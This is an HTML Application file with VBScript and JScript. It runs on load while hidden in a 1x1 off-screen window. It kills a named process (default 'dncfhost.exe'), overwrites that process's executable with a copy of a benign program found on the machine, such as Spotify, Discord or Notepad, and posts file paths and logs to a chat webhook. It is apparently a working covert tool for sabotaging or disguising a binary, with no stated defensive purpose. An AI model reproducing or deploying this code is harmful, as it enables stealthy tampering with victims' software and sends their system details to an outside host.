<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION
    ID="SD"
    APPLICATIONNAME="SD"
    BORDER="none"
    BORDERSTYLE="none"
    CAPTION="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
/>
<title></title>
<style>
body { margin: 0; padding: 0; background: transparent; }
</style>
</head>
<body>
<script type="text/vbscript">
Function GetProcessByName(pn)
    On Error Resume Next
    Dim o, c, p, f
    f = False
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        f = True
        Exit For
    Next
    GetProcessByName = f
End Function

Function GetProcessPath(pn)
    On Error Resume Next
    Dim o, c, p
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT ExecutablePath FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        If Not IsNull(p.ExecutablePath) Then
            GetProcessPath = p.ExecutablePath
            Exit Function
        End If
    Next
    GetProcessPath = ""
End Function

Function KillProcessByName(pn)
    On Error Resume Next
    Dim o, c, p
    Set o = GetObject("winmgmts:\\.\root\cimv2")
    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
    For Each p in c
        p.Terminate()
    Next
End Function

Function BinaryCopy(sf, tf)
    On Error Resume Next
    Dim a, b, fso, tfo
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(sf) Then
        BinaryCopy = False
        Exit Function
    End If
    If Not fso.FileExists(tf) Then
        BinaryCopy = False
        Exit Function
    End If
    Set tfo = fso.GetFile(tf)
    If tfo.Attributes And 1 Then
        tfo.Attributes = tfo.Attributes - 1
    End If
    Set a = CreateObject("ADODB.Stream")
    a.Type = 1
    a.Open
    a.LoadFromFile sf
    b = a.Read
    a.Close
    a.Open
    a.Type = 1
    a.Write b
    a.SaveToFile tf, 2
    a.Close
    BinaryCopy = True
End Function

Function FindRecursive(folder, fn)
    On Error Resume Next
    Dim fso, f, sf, result
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    If Not fso.FolderExists(folder) Then
        FindRecursive = ""
        Exit Function
    End If
    
    Set f = fso.GetFolder(folder)
    
    ' Check current folder
    If fso.FileExists(fso.BuildPath(folder, fn)) Then
        FindRecursive = fso.BuildPath(folder, fn)
        Exit Function
    End If
    
    ' Check subfolders (max depth 3 to avoid performance issues)
    Dim depth
    depth = Len(folder) - Len(Replace(folder, "\", ""))
    
    If depth < 5 Then
        For Each sf in f.SubFolders
            result = FindRecursive(sf.Path, fn)
            If result <> "" Then
                FindRecursive = result
                Exit Function
            End If
        Next
    End If
    
    FindRecursive = ""
End Function
</script>
<script type="text/javascript">
window.resizeTo(1,1);
window.moveTo(-2000,-2000);

var WEBHOOK_URL = "";
var logMessages = [];

function log(msg) {
    var timestamp = new Date().toISOString();
    var logMsg = "[" + timestamp + "] " + msg;
    logMessages.push(logMsg);
}

function sendWebhook(content, fileContent) {
    try {
        log("Sending webhook...");
        
        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        http.open("POST", WEBHOOK_URL, false);
        http.setRequestHeader("Content-Type", "application/json");
        
        var fullContent = content;
        if (fileContent) {
            // Limita il log a 1500 caratteri per evitare messaggi troppo lunghi
            var truncatedLog = fileContent;
            if (fileContent.length > 1500) {
                truncatedLog = fileContent.substring(0, 1500) + "\n... (truncated)";
            }
            fullContent += "\\n\\n```\\n" + truncatedLog + "\\n```";
        }
        
        // Escape delle virgolette e newline per JSON
        var escapedContent = fullContent.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "");
        
        var payload = '{"content":"' + escapedContent + '","username":"Replace Bot"}';
        
        http.send(payload);
        
        var status = http.status;
        log("Webhook response status: " + status);
        
        if (status >= 200 && status < 300) {
            log("Webhook sent successfully!");
            return true;
        } else {
            log("Webhook failed with status: " + status);
            return false;
        }
    } catch(e) {
        log("Webhook error: " + e.message);
        return false;
    }
}

function saveSummary() {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var sh = new ActiveXObject("WScript.Shell");
        var tempPath = sh.ExpandEnvironmentStrings("%TEMP%");
        var summaryPath = fso.BuildPath(tempPath, "replace_summary.txt");
        
        var ts = fso.CreateTextFile(summaryPath, true);
        ts.WriteLine("=== REPLACE OPERATION SUMMARY ===");
        ts.WriteLine("Timestamp: " + new Date().toString());
        ts.WriteLine("");
        
        for (var i = 0; i < logMessages.length; i++) {
            ts.WriteLine(logMessages[i]);
        }
        
        ts.Close();
        log("Summary saved to: " + summaryPath);
        return summaryPath;
    } catch(e) {
        log("Error saving summary: " + e.message);
        return null;
    }
}

function readFile(path) {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var ts = fso.OpenTextFile(path, 1);
        var content = ts.ReadAll();
        ts.Close();
        return content;
    } catch(e) {
        return null;
    }
}

function p() {
    try {
        var w = new ActiveXObject("WScript.Shell");
        var e = w.Environment("Process");
        var c = e("CMDLINE");
        var m = c.match(/--name\s+(\S+)/i);
        if (m) {
            log("Target process name from cmdline: " + m[1]);
            return m[1];
        }
    } catch(x) {
        log("Error reading cmdline: " + x.message);
    }
    log("Using default target: dncfhost.exe");
    return "dncfhost.exe";
}

function findLegitimateExe() {
    log("Searching for legitimate executable...");
    
    var sh = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    // Lista di software legittimi da cercare in ordine di priorit√†
    var targets = [
        {name: "Spotify.exe", hint: "Spotify"},
        {name: "Discord.exe", hint: "Discord"},
        {name: "Teams.exe", hint: "Microsoft Teams"},
        {name: "Slack.exe", hint: "Slack"},
        {name: "Skype.exe", hint: "Skype"},
        {name: "notepad.exe", hint: "Notepad"}
    ];
    
    // Percorsi comuni dove cercare
    var searchPaths = [
        sh.ExpandEnvironmentStrings("%APPDATA%"),
        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%"),
        sh.ExpandEnvironmentStrings("%PROGRAMFILES%"),
        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%")
    ];
    
    // Cerca ogni target
    for (var i = 0; i < targets.length; i++) {
        var target = targets[i];
        log("Searching for " + target.hint + "...");
        
        // Cerca nei percorsi comuni
        for (var j = 0; j < searchPaths.length; j++) {
            var basePath = searchPaths[j];
            log("  Checking: " + basePath);
            
            try {
                var result = FindRecursive(basePath, target.name);
                if (result && result !== "") {
                    log("FOUND: " + result);
                    return result;
                }
            } catch(e) {
                log("  Error searching " + basePath + ": " + e.message);
            }
        }
    }
    
    // Fallback: notepad.exe in System32
    var fallback = "C:\\Windows\\System32\\notepad.exe";
    log("Using fallback: " + fallback);
    return fallback;
}

function w(pn, cb) {
    log("Waiting for process " + pn + " to terminate...");
    var attempts = 0;
    var maxAttempts = 30;
    var i = window.setInterval(function() {
        attempts++;
        var r = GetProcessByName(pn);
        if (!r) {
            log("Process " + pn + " terminated after " + attempts + " seconds");
            clearInterval(i);
            cb();
        } else if (attempts >= maxAttempts) {
            log("Timeout waiting for " + pn + " termination (" + maxAttempts + "s elapsed)");
            clearInterval(i);
            cb();
        }
    }, 1000);
}

function ex() {
    log("=== Starting replace operation ===");
    
    var pn = p();
    log("Target process: " + pn);
    
    var tf = GetProcessPath(pn);
    log("Target file path: " + (tf || "NOT FOUND"));
    
    if (!tf || tf === "") {
        log("ERROR: Target file path not found, aborting");
        sendReport("‚ùå Replace failed: Target file path not found");
        window.setTimeout(function() { window.close(); }, 2000);
        return;
    }
    
    var sf = findLegitimateExe();
    log("Source file: " + sf);
    
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    
    if (!fso.FileExists(sf)) {
        log("ERROR: Source file does not exist: " + sf);
        sendReport("‚ùå Replace failed: Source file not found");
        window.setTimeout(function() { window.close(); }, 2000);
        return;
    }
    
    if (!fso.FileExists(tf)) {
        log("ERROR: Target file does not exist: " + tf);
        sendReport("‚ùå Replace failed: Target file not found");
        window.setTimeout(function() { window.close(); }, 2000);
        return;
    }
    
    // Get file info
    var sfFile = fso.GetFile(sf);
    var tfFile = fso.GetFile(tf);
    var sfSize = sfFile.Size;
    var tfSize = tfFile.Size;
    var sfDate = sfFile.DateLastModified;
    var tfDate = tfFile.DateLastModified;
    
    log("Source file size: " + sfSize + " bytes (modified: " + sfDate + ")");
    log("Target file size: " + tfSize + " bytes (modified: " + tfDate + ")");
    
    try {
        log("Attempting to kill process: " + pn);
        KillProcessByName(pn);
        log("Kill command sent");
    } catch(x) {
        log("Error killing process: " + x.message);
    }
    
    window.setTimeout(function() {
        var sr = GetProcessByName(pn);
        if (sr) {
            log("Process still running, waiting...");
            w(pn, function() { r(); });
        } else {
            log("Process terminated, proceeding with replace");
            r();
        }
    }, 2000);
    
    function r() {
        log("Executing binary copy...");
        try {
            var success = BinaryCopy(sf, tf);
            if (success) {
                log("‚úì Binary copy SUCCESS");
                log("Replaced: " + tf);
                log("With: " + sf);
                
                // Verifica la copia
                var newSize = fso.GetFile(tf).Size;
                log("New target file size: " + newSize + " bytes");
                
                var msg = "‚úÖ **Replace Successful!**\\n";
                msg += "üìÅ **Target:** `" + tf + "`\\n";
                msg += "üìÑ **Source:** `" + sf + "`\\n";
                msg += "üìä **Original Size:** " + tfSize + " bytes\\n";
                msg += "üìä **New Size:** " + newSize + " bytes\\n";
                msg += "üïê **Time:** " + new Date().toLocaleString();
                
                sendReport(msg);
            } else {
                log("‚úó Binary copy FAILED");
                sendReport("‚ùå Replace failed during binary copy");
            }
        } catch(x) {
            log("ERROR during binary copy: " + x.message);
            sendReport("‚ùå Replace error: " + x.message);
        }
        
        log("=== Replace operation completed ===");
        window.setTimeout(function() { window.close(); }, 2000);
    }
}

function sendReport(summary) {
    log("Preparing report...");
    var summaryPath = saveSummary();
    
    var fileContent = null;
    if (summaryPath) {
        fileContent = readFile(summaryPath);
    }
    
    if (!fileContent) {
        fileContent = logMessages.join("\n");
    }
    
    sendWebhook(summary, fileContent);
}

window.onload = function() {
    log("HTA loaded, starting operation in 500ms...");
    window.setTimeout(function() { 
        try {
            ex(); 
        } catch(e) {
            log("FATAL ERROR: " + e.message);
            sendReport("‚ùå Fatal error: " + e.message);
            window.setTimeout(function() { window.close(); }, 2000);
        }
    }, 500);
};
</script>
</body>
</html>
